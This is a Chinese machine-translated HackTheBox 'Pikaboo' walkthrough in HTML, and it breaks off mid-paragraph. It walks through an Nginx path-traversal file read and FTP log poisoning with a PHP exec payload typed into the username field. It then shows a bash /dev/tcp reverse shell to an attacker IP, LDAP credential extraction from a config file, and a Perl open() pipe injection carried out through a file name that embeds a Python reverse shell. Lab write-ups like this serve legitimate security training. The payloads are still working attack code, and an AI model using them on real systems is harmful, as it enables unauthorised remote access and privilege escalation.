<html>
<head>
<title>Pikaboo from HackTheBox — Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">黑客盒子里的皮卡布——详细演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/pikaboo-from-hackthebox-detailed-walkthrough-f66ef4586f31?source=collection_archive---------2-----------------------#2021-12-03">https://infosecwriteups.com/pikaboo-from-hackthebox-detailed-walkthrough-f66ef4586f31?source=collection_archive---------2-----------------------#2021-12-03</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="7f42" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">展示完成盒子所需的所有工具和技术。</p><h1 id="d9d4" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">机器信息</h1><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi lj"><img src="../Images/3bcd88eefaef1aaf41904eb3f3a67b3a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*fsTEQmRvno5cKgod.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">黑客盒子皮卡布</figcaption></figure><p id="b9eb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Pikaboo是HackTheBox上的硬机。我们最初的扫描只发现三个开放的端口，web服务器是我们的起点。我们发现了一个本地文件漏洞，它允许我们访问一个管理区域，从那里我们模糊并找到一个日志文件。我们使用文件中毒来实现远程代码执行，给我们一个反向外壳。我们的root路径包括perl脚本、cronjobs、ldap扫描，最终找到ftp服务器的凭证。在那里，我们利用一个漏洞，通过利用一个写得很差的脚本来获得一个反向根外壳。</p><p id="e543" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所需技能是良好的网络和操作系统枚举知识。学到的技能是研究利用和有条不紊地测试，以找到一个工作的前进方向。</p><div class="lv lw gp gr lx ly"><a href="https://www.hackthebox.eu/home/machines/profile/360" rel="noopener  ugc nofollow" target="_blank"><div class="lz ab fo"><div class="ma ab mb cl cj mc"><h2 class="bd ir gy z fp md fr fs me fu fw ip bi translated">侵入测试实验室</h2><div class="mf l"><h3 class="bd b gy z fp md fr fs me fu fw dk translated">登录Hack The Box平台，让您的笔测试和网络安全技能更上一层楼！</h3></div><div class="mg l"><p class="bd b dl z fp md fr fs me fu fw dk translated">www.hackthebox.eu</p></div></div><div class="mh l"><div class="mi l mj mk ml mh mm lp ly"/></div></div></a></div><h1 id="1f1c" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">初步侦察</h1><p id="27c0" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">像往常一样，让我们从Nmap开始:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi ms"><img src="../Images/56adec468ad1580334903d9c13a8a0a7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZAjiIaGwxGl0jtbdvnB5ww.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Nmap扫描输出</figcaption></figure><p id="9ad0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们只有三个开放的港口。首先，将服务器IP添加到我们主机的文件中:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="a9ac" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/pikaboo]<br/>└─# echo "10.10.10.249 pikaboo.htb" &gt;&gt; /etc/hosts</span></pre><p id="2b46" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在看看端口80上的网站:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nh"><img src="../Images/f546297382d22633787e99d0a03639ab.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*7pjTxkHl4FjibBRM.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">皮卡布网站</figcaption></figure><p id="1660" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是一个有趣的静态网站:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi ni"><img src="../Images/6f6c4bd25f25e267f92d62c23165469d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*DJQu5dJeV2oalw9D.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">皮卡布生物</figcaption></figure><p id="dd92" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">主页面上没有任何值得注意的东西，但是点击管理链接会把我们带到一个登录框。如果我们取消它，我们会在这里结束:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nj"><img src="../Images/4b2d8ac0e9d66caad4c7a42ac96f0ff6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*k-iHl7q66RH3vP2y.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">未经授权的重定向</figcaption></figure><p id="f73b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是因为我们的Nmap扫描只发现Nginx在端口80上运行，但这里我们有Apache在端口81上运行。localhost IP 127 . 0 . 0 . 1告诉我们，当访问此页面时，我们正在本地通过端口80到81的机器。</p><p id="9af1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一些搜索发现<a class="ae nk" href="https://book.hacktricks.xyz/pentesting/pentesting-web/nginx" rel="noopener ugc nofollow" target="_blank">这个</a>来自Hacktricks，它解释了一个本地文件漏洞，允许我们读取webroot之外的文件。</p><p id="f24f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们用它扫描一下，看看有没有什么有用的东西:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nl"><img src="../Images/a1d0363abb76ce06f6c2847b78b00355.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RQjCGRadGFzOMNS6pUMRKQ.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Gobuster扫描有用的文件</figcaption></figure><p id="b19d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们在Apache docs网站上找到一个服务器状态页面，这里有详细的<a class="ae nk" href="https://httpd.apache.org/docs/2.4/mod/mod_status.html" rel="noopener ugc nofollow" target="_blank">信息</a>，我们可以看到这很有趣。让我们来看看:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nm"><img src="../Images/0525b62522df8ccfc5b69062094cd7db.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*y3Dy9SzprLjMnarY.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">服务器状态输出</figcaption></figure><p id="feb7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们找到服务器信息，在底部，我们有一个正在运行的进程列表:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nn"><img src="../Images/d5c478c3a9155b1891ad14625eca563b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*kZLU-OFmQNJbpdiV.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">服务器状态进程列表</figcaption></figure><p id="b610" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在该列表中，我们会看到另一个名为admin_staging的页面，访问该页面时，我们会看到一个控制面板:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi no"><img src="../Images/cf448657b5c1ad5bc3c7620640b93aa3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*gV4jbYXA99a6HMf-.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">管理仪表板</figcaption></figure><p id="75a6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里没什么特别的，但有一点需要注意，当我们浏览时，URL会发生变化:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="23da" class="nc km iq my b gy nd ne l nf ng">http://pikaboo.htb/admin../admin_staging/index.php?page=user.php<br/>http://pikaboo.htb/admin../admin_staging/index.php?page=tables.php<br/>http://pikaboo.htb/admin../admin_staging/index.php?page=typography.php</span></pre><p id="4ad0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以模糊page=参数，看看是否还有其他页面没有找到。Hacktricks有一个很好的指南<a class="ae nk" href="https://book.hacktricks.xyz/pentesting-web/web-tool-wfuzz" rel="noopener ugc nofollow" target="_blank">在这里</a>我们可以使用:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nl"><img src="../Images/649998366a439312735a93f1d9515fba.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qyOEeAzL_4k9JVLRbYtlZg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">隐藏文件的wfuzz</figcaption></figure><p id="2760" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">经过几次迭代，我想到了上面的限制输出，所以我们只是做了一些有用的事情。vsftpd.log文件几乎肯定与我们之前在Nmap扫描中发现的FTP服务器有关。</p><p id="2e34" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们来看看:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi np"><img src="../Images/c7523b3ab4ff64eac7e8f8989a4a28a3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NYllTAlRafhX-JFPz55eCw.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">vsftpd注销</figcaption></figure><p id="3796" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们已经检索了FTP日志文件，其中显示了用户名pwnmeow。经过一段时间的观察，我发现了一个漏洞，并找到了这个包含文件的方法。更多信息<a class="ae nk" href="https://shahjerry33.medium.com/rce-via-lfi-log-poisoning-the-death-potion-c0831cebc16d" rel="noopener">在这里</a>和<a class="ae nk" href="https://secnhack.in/ftp-log-poisoning-through-lfi/" rel="noopener ugc nofollow" target="_blank">在这里</a>帮助我想出下一步行动。</p><p id="cac0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以连接到FTP服务器，并使用所描述的方法来执行任意代码。首先，让我们测试我们的理论:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="53a9" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/pikaboo]<br/>└─# ftp pikaboo.htb<br/>Connected to pikaboo.htb.<br/>220 (vsFTPd 3.0.3)<br/>Name (pikaboo.htb:kali): &lt;?php exec("/bin/bash -c 'ping -c 4 10.10.14.43'"); ?&gt;<br/>331 Please specify the password.<br/>Password:<br/>530 Login incorrect.<br/>Login failed.<br/>ftp&gt; quit<br/>221 Goodbye.</span></pre><p id="48e8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这已将我们的代码放入FTP日志文件中，现在我们需要读取日志以使其被执行:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="68bd" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/pikaboo]<br/>└─# curl http://pikaboo.htb/admin../admin_staging/index.php?page=/var/log/vsftpd.log</span></pre><p id="d1ca" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">切换到另一个终端，使用tcpdump监听ping:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nq"><img src="../Images/271a41111213a0e7194f000305ce6621.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ERxuj189luMBgMM14z8QbQ.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">从框中Ping回</figcaption></figure><p id="65e0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们捕获来自机器的ping，这证明我们成功地执行了代码。让我们试着得到一个反向的shell，我用了一个来自<a class="ae nk" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" rel="noopener ugc nofollow" target="_blank"> Pentestmonkey </a>的简单shell:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="df0c" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/pikaboo]<br/>└─# ftp pikaboo.htb<br/>Connected to pikaboo.htb.<br/>220 (vsFTPd 3.0.3)<br/>Name (pikaboo.htb:kali): &lt;?php exec("/bin/bash -c 'bash -i &gt; /dev/tcp/10.10.14.43/1337 0&gt;&amp;1'"); ?&gt;<br/>331 Please specify the password.<br/>Password:<br/>530 Login incorrect.<br/>Login failed.<br/>ftp&gt; quit<br/>221 Goodbye.</span></pre><p id="258d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们的代码放在日志中，现在读取它来执行:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="6208" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/pikaboo]<br/>└─# curl http://pikaboo.htb/admin../admin_staging/index.php?page=/var/log/vsftpd.log</span></pre><p id="4752" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">切换到等待中的Netcat监听器，查看我们是否已连接:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="6309" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~]<br/>└─# nc -lvvp 1337<br/>listening on [any] 1337 ...<br/>connect to [10.10.14.43] from pikaboo.htb [10.10.10.249] 55792<br/>id<br/>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br/>python3 -c 'import pty;pty.spawn("/bin/bash")'<br/>www-data@pikaboo:/var/www/html/admin_staging$</span></pre><p id="9641" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们先获取用户标志:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="28c5" class="nc km iq my b gy nd ne l nf ng">www-data@pikaboo:/var/www/html/admin_staging$ ls -l /home<br/>drwxr-xr-x 2 pwnmeow pwnmeow 569344 Jul  6 20:02 pwnmeow<br/><br/>www-data@pikaboo:/var/www/html/admin_staging$ ls -l /home/pwnmeow<br/>-r--r----- 1 pwnmeow www-data 33 Nov 12 21:55 user.txt<br/><br/>www-data@pikaboo:/var/www/html/admin_staging$ cat /home/pwnmeow/user.txt<br/>&lt;HIDDEN&gt;</span></pre><p id="496a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我花了相当多的时间四处查看，当我进入系统crontab时，我注意到一些有趣的事情:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nr"><img src="../Images/a5c1875cb21e12f7e5286e120f2fd205.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XyQDpYIMM08iiuPWqAemtg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">crontab的内容</figcaption></figure><p id="bdca" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后一行以root用户身份每分钟运行一次csvupdate_cron作业。让我们来看看:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="0c47" class="nc km iq my b gy nd ne l nf ng">www-data@pikaboo:/$ cat /usr/local/bin/csvupdate_cron<br/>cat /usr/local/bin/csvupdate_cron<br/>#!/bin/bash<br/><br/>for d in /srv/ftp/*<br/>do<br/>  cd $d<br/>  /usr/local/bin/csvupdate $(basename $d) *csv<br/>  /usr/bin/rm -rf *<br/>done</span></pre><p id="ddcd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们看到，job循环遍历/srv/ftp文件夹中的所有文件，对于每个文件，它都运行脚本csvupdate，将文件名作为参数。</p><p id="9ac3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">查看csvupdate脚本，我们会发现一个很长的Perl脚本:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="d374" class="nc km iq my b gy nd ne l nf ng">www-data@pikaboo:/$ cat /usr/local/bin/csvupdate<br/>#!/usr/bin/perl<br/>##################################################################<br/># Script for upgrading PokeAPI CSV files with FTP-uploaded data. #<br/>#                                                                #<br/># Usage:                                                         #<br/># ./csvupdate &lt;type&gt; &lt;file(s)&gt;                                   #<br/>#                                                                #<br/># Arguments:                                                     #<br/># - type: PokeAPI CSV file type                                  #<br/>#         (must have the correct number of fields)               #<br/># - file(s): list of files containing CSV data                   #<br/>##################################################################<br/><br/>use strict;<br/>use warnings;<br/>use Text::CSV;<br/><br/>my $csv_dir = "/opt/pokeapi/data/v2/csv";</span></pre><p id="e114" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">描述告诉我们它是用来升级数据的，进一步看内容，我们会在最后看到这一部分:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="2a47" class="nc km iq my b gy nd ne l nf ng">my $csv = Text::CSV-&gt;new({ sep_char =&gt; ',' });<br/>my $fname = "${csv_dir}/${type}.csv";<br/>open(my $fh, "&gt;&gt;", $fname) or die "Unable to open CSV target file.\n";</span></pre><p id="9ae4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这看起来像是接受文件名，检查它的结尾。csv，然后使用打开命令。我不知道现在去哪里，所以继续进一步列举文件系统。</p><p id="e2e3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当我查看套接字时，我看到LDAP在端口389上侦听127.0.0.1:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="84a9" class="nc km iq my b gy nd ne l nf ng">www-data@pikaboo:/var/www/html/admin_staging$ ss -tln<br/>ss -tln<br/>State     Recv-Q    Send-Q     Local Address:Port       Peer Address:Port    <br/>LISTEN    0         128              0.0.0.0:80         0.0.0.0:*       <br/>LISTEN    0         128            127.0.0.1:81         0.0.0.0:*       <br/>LISTEN    0         128              0.0.0.0:22         0.0.0.0:*       <br/>LISTEN    0         128            127.0.0.1:389        0.0.0.0:*       <br/>LISTEN    0         128                 [::]:80            [::]:*       <br/>LISTEN    0         32                     *:21               *:*       <br/>LISTEN    0         128                 [::]:22            [::]:*</span></pre><p id="c534" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">另一个内部系统，一定是用来做什么的。再次回头看看，我找到了一些pokeapi的配置文件:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="878b" class="nc km iq my b gy nd ne l nf ng">www-data@pikaboo:/$ ls -l /opt/pokeapi/config<br/>-rwxr-xr-x 1 root root    0 Jul  6 20:17 __init__.py<br/>drwxr-xr-x 2 root root 4096 Jul  6 16:10 __pycache__<br/>-rw-r--r-- 1 root root  783 Jul  6 20:17 docker-compose.py<br/>-rwxr-xr-x 1 root root  548 Jul  6 20:17 docker.py<br/>-rwxr-xr-x 1 root root  314 Jul  6 20:17 local.py<br/>-rwxr-xr-x 1 root root 3080 Jul  6 20:17 settings.py<br/>-rwxr-xr-x 1 root root  181 Jul  6 20:17 urls.py<br/>-rwxr-xr-x 1 root root 1408 Jul  6 20:17 wsgi.py</span></pre><p id="44c5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">设置文件很有用:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="eee8" class="nc km iq my b gy nd ne l nf ng">www-data@pikaboo:/$ cat /opt/pokeapi/config/settings.py<br/>&lt;SNIP&gt;<br/>DATABASES = {<br/>    "ldap": {<br/>        "ENGINE": "ldapdb.backends.ldap",<br/>        "NAME": "ldap:///",<br/>        "USER": "cn=binduser,ou=users,dc=pikaboo,dc=htb",<br/>        "PASSWORD": "&lt;HIDDEN&gt;",<br/>    },<br/>    "default": {<br/>        "ENGINE": "django.db.backends.sqlite3",<br/>        "NAME": "/opt/pokeapi/db.sqlite3",<br/>    }<br/>}</span></pre><p id="89b9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们看到一个包含凭据的LDAP部分，在框中可以看到ldapsearch。使用<a class="ae nk" href="https://docs.oracle.com/cd/E19693-01/819-0997/auto45/index.html" rel="noopener ugc nofollow" target="_blank">这个</a>有用的文档，我找到了这一部分:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="5e37" class="nc km iq my b gy nd ne l nf ng">Returning All Entries<br/>Given the previous information, the following call will return all entries in the directory:<br/><br/>ldapsearch -h myServer -p 5201 -D cn=admin,cn=Administrators,cn=config<br/> -b "dc=example,dc=com" -s sub "(objectclass=*)"<br/>"(objectclass=*)" is a search filter that matches any ent</span></pre><p id="d7c8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我将它与我们刚刚找到的creds一起使用，以转储所有LDAP条目:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nr"><img src="../Images/dc072b7efbd0347f0a3cbb005bc00917.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5l6vQWvWdziZsG1NGpkabg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Ldapsearch转储所有条目</figcaption></figure><p id="e070" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">输出很长，但这部分正是我想要的:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="3f46" class="nc km iq my b gy nd ne l nf ng"># pwnmeow, users, ftp.pikaboo.htb<br/>dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb<br/>objectClass: inetOrgPerson<br/>objectClass: posixAccount<br/>objectClass: shadowAccount<br/>uid: pwnmeow<br/>cn: Pwn<br/>sn: Meow<br/>loginShell: /bin/bash<br/>uidNumber: 10000<br/>gidNumber: 10000<br/>homeDirectory: /home/pwnmeow<br/>userPassword:: &lt;HIDDEN&gt;</span></pre><p id="4714" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该密码显然是base64编码的，因为它在末尾有一个指示符double ==:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="9da1" class="nc km iq my b gy nd ne l nf ng">www-data@pikaboo:/$ echo "&lt;HIDDEN&gt;" | base64 -d<br/>echo "&lt;HIDDEN&gt;" | base64 -d<br/>&lt;HIDDEN&gt;</span></pre><p id="83db" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">解码给了我们一个明文密码。让我们尝试使用这些凭据进行ftp登录:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="d1bc" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/pikaboo]<br/>└─# ftp pikaboo.htb<br/>Connected to pikaboo.htb.<br/>220 (vsFTPd 3.0.3)<br/>Name (pikaboo.htb:kali): pwnmeow<br/>331 Please specify the password.<br/>Password:<br/>230 Login successful.<br/>Remote system type is UNIX.<br/>Using binary mode to transfer files.<br/>ftp&gt; pwd<br/>257 "/" is the current directory<br/>ftp&gt; ls<br/>200 PORT command successful. Consider using PASV.<br/>150 Here comes the directory listing.<br/>drwx-wx---    2 ftp  ftp  4096 Nov 13 08:47 abilities<br/>drwx-wx---    2 ftp  ftp   4096 May 20 07:01 ability_changelog<br/>drwx-wx---    2 ftp  ftp  4096 May 20 07:01 ability_changelog_prose<br/>drwx-wx---    2 ftp  ftp  4096 May 20 07:01 ability_flavor_text<br/>drwx-wx---    2 ftp  ftp  4096 May 20 07:01 ability_names</span></pre><p id="62fa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">不出所料，它成功了，我们成功了。没什么可看的，这让我困惑了很长时间。最后，我回头看了看我们找到的Perl脚本，围绕它使用的open命令搜索了一些漏洞，得到了大量信息:</p><p id="fae7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae nk" href="https://cheatsheet.haax.fr/linux-systems/programing-languages/perl/" rel="noopener ugc nofollow" target="_blank">https://cheat sheet . haax . fr/Linux-systems/programming-languages/perl</a><a class="ae nk" href="https://stackoverflow.com/questions/26614348/perl-open-injection-prevention" rel="noopener ugc nofollow" target="_blank">https://stack overflow . com/questions/26614348/perl-open-injection-prevention</a><a class="ae nk" href="https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88890543" rel="noopener ugc nofollow" target="_blank">https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId = 88890543</a><a class="ae nk" href="https://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8_2-Command-Injections.pdf" rel="noopener ugc nofollow" target="_blank">https://research . cs . wisc . edu/mist/software security course/Chapters/3 _ 8 _ 2-Command-injections . pdf</a>T8】https://perl-begin . org/topics/security/code-markup-injection</p><p id="dbec" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">经过大量的阅读和反复试验，我发现我们可以通过上传一个文件并重命名它来利用csvupdate Perl脚本，这样开始的字符就是一个管道。然后我们就可以执行它之后的任何代码。</p><p id="36ee" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我尝试了一个经典的Pentestmonkey <a class="ae nk" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" rel="noopener ugc nofollow" target="_blank"> Python反向shell </a>没有成功。不过，在其他盒子上使用的一个更简单的方法确实有效。</p><p id="533d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了利用这一点，我们需要我们的文件在通过ftp上传后被命名为this:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="fdd8" class="nc km iq my b gy nd ne l nf ng">"|python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.239\",1338));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""\"sh\",""\"-i\"])';.csv"</span></pre><p id="89c7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi 